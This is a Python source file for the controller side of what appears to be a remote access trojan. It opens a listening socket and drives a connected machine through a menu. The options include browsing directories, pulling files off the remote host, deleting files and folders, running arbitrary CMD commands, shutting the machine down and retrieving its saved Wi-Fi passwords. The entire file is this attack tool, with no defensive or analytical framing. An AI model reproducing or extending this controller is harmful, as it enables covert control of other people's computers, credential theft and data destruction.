import socket
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '127.0.0.1'
port = 8080

s.bind((host, port))
print("")
print("Server is currently running @", host)
print(" listening")
s.listen(1)

conn, addr = s.accept()
print(addr, " Has connected")
print("")

while 1:

    print("1: View cwd\n"
          "2: View custom Dir\n"
          "3: Download File \n"
          "4: Delete File \n"
          "5: Delete Dir  \n"
          "6: Create File \n"

          "7: Return ipconfig (TODO...) \n"
          "8: Execute custom CMD command \n"
          "9: Shut it down -MC Hammer \n"
          "10:Get wifiPassword list  \n"
          "11:Other  \n"
          "12:kill  \n"
          "13:send file  \n"
          )
    print("")
    command = input(str("command >> "))

    if command == "1":
        conn.send(command.encode())
        files = conn.recv(5000)
        files = files.decode()
        print("Command output:", files)

    elif command == "2":
        conn.send(command.encode())
        userInput = input(str("Custom Dir: "))
        conn.send(userInput.encode())
        files = conn.recv(5000)
        files = files.decode()
        print("Custom dir: ", files)

    elif command == "3":
        conn.send(command.encode())
        filePath = input(str(" please enter the files path: "))
        conn.send(filePath.encode())
        file = conn.recv(500000)
        fileName = input(str("please enter name of file with extension: "))
        newFile = open(fileName, "wb")
        newFile.write(file)
        newFile.close()
        print("Downloaded and saved")

    elif command == "4":
        # delete file
        conn.send(command.encode())
        conn.send(input(str("Enter path and name of file to delete: ")).encode())
        result = conn.recv(50000).decode()
        print(result)

    elif command == "5":
        # delete dir
        conn.send(command.encode())
        conn.send(input(str("Enter path of Dir to delete: ")).encode())
        result = conn.recv(50000).decode()
        print(result)

    elif command == "6":
        # create file
        conn.send(command.encode())
        conn.send(input(str("Enter path and new of the file to create: ")).encode())
        conn.send(input(str("Enter data to write: ")).encode())
        result = conn.recv(50000).decode()
        print(result)



    elif command == "7":
        print("Please time travel to use")


    elif command == "8":
        conn.send(command.encode())
        print("suggested: taskkill /IM notepad.exe")
        userInput = input(str("Command to run in CMD?: "))
        conn.send(userInput.encode())

        data = conn.recv(500000)
        data.decode()
        print("responce: ", data)
    elif command == "9":
        conn.send(command.encode())
        data = conn.recv(500000)
        data.decode()
        print("responce: ", data)

    elif command == "10":
        conn.send(command.encode())
        data = conn.recv(500000)
        data.decode()
        print("wifi passwords: ", data)

    elif command == "11":
        conn.send(command.encode())
        conn.send(input(str("Enter command: ")).encode())
        data = conn.recv(500000).decode()

        print("output:", data, "\n")
    elif command == "12":
        conn.send(command.encode())
        pass
    elif command == "13":
        conn.send(command.encode())
        filePath = input(str(" please enter the files path: "))
        file = open(filePath, "rb")
        data = file.read()
        conn.send(data)
        fileName = input(str(" please enter the file name: "))
        conn.send(fileName.encode())

        print('sent successfully :)')



    print("")
